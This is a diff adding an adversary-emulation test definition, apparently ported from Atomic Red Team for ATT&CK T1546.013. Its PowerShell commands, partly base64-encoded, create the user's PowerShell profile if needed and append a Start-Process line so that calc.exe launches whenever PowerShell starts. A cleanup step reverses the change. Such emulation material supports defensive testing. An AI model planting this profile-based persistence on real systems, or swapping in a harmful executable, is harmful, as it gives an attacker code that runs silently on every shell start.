@@ -1,0 +1,21 @@
+- id: 2805f533-6fc2-53be-a3ef-ae6aaaf5a814
+  name: Soumaia ART Tests - Append malicious start-process cmdlet
+  description: Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.013
+    name: 'Event Triggered Execution: PowerShell Profile'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAcAByAG8AZgBpAGwAZQApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAHIAbwBmAGkAbABlACAALQBUAHkAcABlACAARgBpAGwAZQAgAC0ARgBvAHIAYwBlAAoA
+          }
+          Add-Content $profile -Value ""
+          Add-Content $profile -Value "Start-Process calc.exe"
+          powershell -Command exit
+        cleanup: |-
+          $oldprofile = cat $profile | Select-Object -skiplast 1
+          Set-Content $profile -Value $oldprofile
